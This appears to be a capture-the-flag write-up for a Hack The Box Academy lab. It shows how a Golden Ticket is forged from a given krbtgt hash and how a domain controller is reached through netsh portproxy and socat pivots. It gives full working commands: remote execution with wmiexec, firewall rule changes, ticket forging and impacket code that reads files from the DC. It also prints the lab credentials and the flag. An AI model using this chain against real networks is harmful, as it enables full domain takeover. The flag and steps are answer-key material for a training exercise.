# Golden Ticket

**Module:** HTB Academy — Kerberos Attacks
**Entry point:** `ACADEMY-KERBATTCK-WS01` (RDP), domain `INLANEFREIGHT.LOCAL`
**Given access:** `htb-student` / `HTB_@cademy_stdnt!`
**Given:** krbtgt NTLM hash `c0231bd8a4a4de92fca0760c0ba9e7a6`
**Goal:** read `C:\Users\Administrator\Documents\goldenticket.txt` on DC01

**Result:** `IMp3rs0natE_Administrator_2_Op3n_tH1s_Fl4G` — forged a Golden Ticket for `INLANEFREIGHT\Administrator` from the krbtgt hash alone and read the flag off DC01's C$ share, ultimately done entirely from Linux through a manual SMB/Kerberos port pivot via WS01.

---

## 1. Attack chain (summary)

1. `nxc smb` confirms `htb-student` has local admin (`Pwn3d!`) on WS01 (10.129.70.126).
2. DC01 is **not** reachable from the attacking box directly — it only has an internal IP (`172.16.99.3`), discovered via `wmiexec.py ... "nslookup DC01.INLANEFREIGHT.LOCAL"` against WS01 (WS01 is dual-homed: public lab network + internal `172.16.99.0/24`).
3. Get the domain SID, forge a Golden Ticket for `Administrator` using the given krbtgt RC4 hash (`Rubeus.exe golden`, `mimikatz kerberos::golden`, and finally `impacket-ticketer`), inject/use it, and read the TGT-protected file off DC01's `C$`.
4. Because DC01 isn't directly routable, pivoted SMB (445), Kerberos (88), and LDAP (389) through WS01 using `netsh interface portproxy`, then a local `socat` redirector, to reach DC01 entirely from Linux without needing the GUI/RDP session that kept failing.

---

## 2. Where I got stuck (and the actual fixes) — this was the long part

### 2.1 DC01 has no routable IP from the attack box

```
wmiexec.py '.../htb-student:...@10.129.70.126' "nslookup DC01.INLANEFREIGHT.LOCAL"
# Address: 172.16.99.3
```
`/dev/tcp/172.16.99.3/445` timed out directly. WS01 is dual-homed (it's the DMZ/jump box), so everything targeting DC01 has to go *through* WS01 one way or another — either interactively via RDP+GUI tools, or by pivoting network traffic. I first tried the GUI route since the module explicitly says "RDP to WS01."

### 2.2 First wrong domain SID: `lookupsid.py` against WS01 lied

```
lookupsid.py 'INLANEFREIGHT.LOCAL/htb-student:...@10.129.70.126' 1
# Domain SID is: S-1-5-21-3259176042-404765537-389377041
```
This is the value I used for **every** golden-ticket forging attempt for the first ~40 minutes (Rubeus, mimikatz, impacket-ticketer all independently failed with it). The real domain SID, confirmed later via a direct LDAP read of `Administrator`'s `objectSid` on DC01, is `S-1-5-21-1870146311-1183348186-593267556` — completely different numbers. `lookupsid.py`'s "Domain SID" line against a non-DC member server queries the LSA policy, which for a domain-joined workstation can return `PolicyAccountDomainInformation`/local info rather than the actual AD domain SID in some impacket/LSA-RPC code paths — it is **not a reliable way to get the domain SID on a non-DC host**. Lesson: get the domain SID from something that's unambiguously tied to the real domain object (an LDAP read of any domain object's `objectSid` and stripping the last RID, or `Get-DomainSID`/`whoami /user` on an actual domain-joined session, or a DC-sourced `lookupsid.py` run) — never trust `lookupsid.py` run against an arbitrary member server for this.

### 2.3 How the wrong SID actually manifested — `KDC_ERR_TGT_REVOKED`, not a decrypt error

This is the critical debugging signal. A **wrong krbtgt key** would cause the KDC to fail decrypting the ticket outright (a checksum/integrity error). Instead, every tool produced the *exact same* symptom:
- Golden ticket forges/imports "successfully" (Rubeus: `[+] Ticket successfully imported!`; mimikatz: `Golden ticket for 'Administrator @ INLANEFREIGHT.LOCAL' successfully submitted for current session`).
- `klist` immediately after shows the forged TGT cached correctly (`Client: Administrator @ INLANEFREIGHT.LOCAL`, `Server: krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL`).
- The *first* use against `\\DC01...\C$` fails with `Access is denied`, and the TGT **disappears from the cache** immediately afterward (`klist` → `Cached Tickets: (0)`) — Windows' Kerberos SSP silently flushes a TGT the KDC has rejected as invalid, so a second identical attempt gets a *different*-looking error (`Cannot find path ... does not exist`, since there's now no ticket at all and the client falls back to an unauthenticated/anonymous view of the share).
- This exact two-stage failure reproduced identically with **three separate tools** (Rubeus, mimikatz, impacket-ticketer), on **two separate SIDs-worth of attempts**, which is what made it clear the problem was a bad *input* (the SID), not a tool bug, a clock-skew issue (verified `w32tm` skew was ~1.8s, fine), or a stale ticket — it was reproducible from scratch every time with the same wrong SID.
- Confirmed this diagnosis directly: once a real Kerberos response was reachable at all (see §2.4), the *exact* error name came back as `KDC_ERR_TGT_REVOKED` from the KDC itself — Microsoft's Kerberos KDC returns this specific error when it can decrypt the TGT (so the krbtgt key is right) but the SID embedded in it doesn't correspond to a real, currently valid principal in that domain — i.e. exactly what a forged ticket with a syntactically-valid-but-wrong domain SID produces.

### 2.4 The GUI/RDP route itself died mid-debug

While debugging the above from inside an `xfreerdp3` RDP session to WS01 (using `xdotool`/`import` screenshots per the established workflow for this module series), a PowerShell `[adsisearcher]` LDAP query hung indefinitely (likely an implicit LDAP bind/referral stall) and the entire `xfreerdp3` process died somewhere in the middle of debugging it — the window disappeared and the process was gone from `ps aux`. Rather than reconnect and lose more time to a flaky GUI session, switched entirely to a Linux-only approach for the rest of the task (see below) — this turned out to be more reliable *and* easier to directly inspect error codes from (PowerShell/.NET's generic `Access is denied` vs. Python's raw `impacket.krb5.kerberosv5.KerberosError: KDC_ERR_TGT_REVOKED` — the latter is what actually cracked the case).

### 2.5 Reaching DC01 from Linux: manual network pivot via WS01

DC01 (`172.16.99.3`) has no route from the attack box. Built one manually, entirely through SMB/RPC commands against WS01 (no GUI needed) using the already-confirmed local-admin access:
```bash
# On WS01, forward 3 ports to DC01's internal IP, each opened through the firewall:
wmiexec.py '.../htb-student:...@10.129.70.126' \
  "netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.99.3"
wmiexec.py '.../htb-student:...@10.129.70.126' \
  "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=88  connectaddress=172.16.99.3"
wmiexec.py '.../htb-student:...@10.129.70.126' \
  "netsh interface portproxy add v4tov4 listenport=3890 listenaddress=0.0.0.0 connectport=389 connectaddress=172.16.99.3"
# + matching netsh advfirewall firewall add rule ... for each listenport
```
This gets SMB/Kerberos/LDAP to DC01 reachable at `10.129.70.126:4445/8888/3890` — but `impacket`'s Kerberos code (`impacket.krb5.kerberosv5.sendReceive`) **hardcodes port 88** for any KDC contact, so pointing `kdcHost` at `10.129.70.126:8888` doesn't work (no way to pass a custom port through the public API). Fixed with a second hop: local `socat` TCP redirectors, listening on the *real* privileged ports on the attack box itself (made possible since `net.ipv4.ip_unprivileged_port_start=0` was already set earlier in this session) forwarding into WS01's proxied ports:
```bash
socat TCP-LISTEN:88,fork,reuseaddr  TCP:10.129.70.126:8888 &   # -> DC01:88  (Kerberos)
socat TCP-LISTEN:445,fork,reuseaddr TCP:10.129.70.126:4445 &   # -> DC01:445 (SMB)
```
Then called impacket directly in Python, pointing both `remoteHost` and `kdcHost` at `127.0.0.1` (no `/etc/hosts` edit needed — `kdcHost`/`remoteHost` are passed explicitly, bypassing DNS entirely):
```python
from impacket.smbconnection import SMBConnection
conn = SMBConnection(remoteName='DC01', remoteHost='127.0.0.1', sess_port=445)
conn.kerberosLogin(user='Administrator', password='', domain='INLANEFREIGHT.LOCAL',
                    useCache=True, kdcHost='127.0.0.1')
```
This is also what surfaced the real `KDC_ERR_TGT_REVOKED` error text directly (§2.3), instead of the opaque `Access is denied` PowerShell/SMB-client had been giving.

### 2.5.1 LDAP needed the same pivot to find the real domain SID

To get the real domain SID that resolved §2.2/2.3, needed an authoritative LDAP read *against DC01 itself* (not WS01, which doesn't run LDAP) — added a fourth port forward (389 → 3890 → local `ldap3` connection to `10.129.70.126:3890`) and read `Administrator`'s `objectSid` directly:
```python
from ldap3 import Server, Connection, NTLM, ALL
s = Server('10.129.70.126:3890', get_info=ALL)
c = Connection(s, user='INLANEFREIGHT\\htb-student', password='HTB_@cademy_stdnt!', authentication=NTLM, auto_bind=True)
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(samaccountname=Administrator)', attributes=['objectSid'])
# S-1-5-21-1870146311-1183348186-593267556-500   <- strip -500 for the domain SID
```

### 2.6 Final, correct forge

```bash
ticketer.py -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 \
    -domain-sid S-1-5-21-1870146311-1183348186-593267556 \
    -domain INLANEFREIGHT.LOCAL Administrator
# -> Administrator.ccache
```
Authenticated immediately — `listShares()` returned `ADMIN$ C$ IPC$ NETLOGON Shares SYSVOL` as Administrator.

---

## 3. Full command sequence (as actually run, from Linux)

```bash
# 1. Confirm access and find DC01's real (internal) IP
nxc smb 10.129.70.126 -u htb-student -p 'HTB_@cademy_stdnt!'
wmiexec.py 'INLANEFREIGHT.LOCAL/htb-student:HTB_@cademy_stdnt!@10.129.70.126' \
    "nslookup DC01.INLANEFREIGHT.LOCAL"
# DC01 = 172.16.99.3, unreachable directly

# 2. Pivot SMB/Kerberos/LDAP through WS01 via netsh portproxy (run once each)
for p in "4445 445" "8888 88" "3890 389"; do
  set -- $p
  wmiexec.py 'INLANEFREIGHT.LOCAL/htb-student:HTB_@cademy_stdnt!@10.129.70.126' \
    "netsh interface portproxy add v4tov4 listenport=$1 listenaddress=0.0.0.0 connectport=$2 connectaddress=172.16.99.3"
  wmiexec.py 'INLANEFREIGHT.LOCAL/htb-student:HTB_@cademy_stdnt!@10.129.70.126' \
    "netsh advfirewall firewall add rule name=pivot$1 dir=in action=allow protocol=TCP localport=$1"
done

# 3. Second hop: local socat redirectors onto the real privileged ports
socat TCP-LISTEN:88,fork,reuseaddr  TCP:10.129.70.126:8888 &
socat TCP-LISTEN:445,fork,reuseaddr TCP:10.129.70.126:4445 &

# 4. Get the REAL domain SID via LDAP straight to DC01 (through the 389 pivot)
python3 -c "
from ldap3 import Server, Connection, NTLM, ALL
s = Server('10.129.70.126:3890', get_info=ALL)
c = Connection(s, user='INLANEFREIGHT\\\\htb-student', password='HTB_@cademy_stdnt!',
               authentication=NTLM, auto_bind=True)
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(samaccountname=Administrator)', attributes=['objectSid'])
print(c.entries)
"
# S-1-5-21-1870146311-1183348186-593267556-500

# 5. Forge the Golden Ticket with the krbtgt hash given in the question
ticketer.py -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 \
    -domain-sid S-1-5-21-1870146311-1183348186-593267556 \
    -domain INLANEFREIGHT.LOCAL Administrator

# 6. Authenticate to DC01 and read the flag, via the local socat pivot
export KRB5CCNAME="$(pwd)/Administrator.ccache"
python3 - <<'EOF'
from impacket.smbconnection import SMBConnection
import io
conn = SMBConnection(remoteName='DC01', remoteHost='127.0.0.1', sess_port=445)
conn.kerberosLogin(user='Administrator', password='', domain='INLANEFREIGHT.LOCAL',
                    useCache=True, kdcHost='127.0.0.1')
buf = io.BytesIO()
conn.getFile('C$', 'Users\\Administrator\\Documents\\goldenticket.txt', buf.write)
print(buf.getvalue().decode())
EOF
# IMp3rs0natE_Administrator_2_Op3n_tH1s_Fl4G
```

---

## 4. Flag

**`IMp3rs0natE_Administrator_2_Op3n_tH1s_Fl4G`**

---

## 5. Key takeaways

- **A Golden Ticket needs exactly three correct ingredients: krbtgt key, domain SID, and target username.** Get the SID wrong and every tool (Rubeus, mimikatz, impacket) fails identically and non-obviously — not with a crypto/decrypt error, but with `KDC_ERR_TGT_REVOKED`, because the KDC can still decrypt the ticket (the krbtgt key is fine) but the embedded SID doesn't correspond to a real account, so it's treated as invalid/revoked rather than malformed.
- **`lookupsid.py` (or any LSA-policy-based SID lookup) run against a non-DC member server is not a trustworthy source for the domain SID.** Get it from an LDAP object's `objectSid` on the DC itself (strip the trailing RID), or from a tool/session actually running as a domain principal.
- When a Kerberos operation fails with a vague client-side error (`Access is denied` from PowerShell/SMB), re-run the same operation through a path that surfaces the **raw KDC error code** (e.g. impacket's `KerberosError` exceptions) — `KDC_ERR_TGT_REVOKED` vs. a generic decrypt failure point at completely different root causes and would have been invisible from the Windows side alone.
- A target DC with no routable IP from the attacker can still be fully reached read/write over SMB, Kerberos, and LDAP by chaining `netsh interface portproxy` on a dual-homed pivot host with existing local-admin access, plus a local `socat` hop to land traffic back on the literal privileged ports impacket's Kerberos client hardcodes (88) — no C2/tunneling framework required.
- Don't trust a hung GUI/RDP session to keep debugging state around — when `xfreerdp3` itself dies mid-investigation, switching to a Linux-native path isn't just a fallback, it can directly produce better diagnostic information (raw protocol error codes) than the GUI tools were showing in the first place.
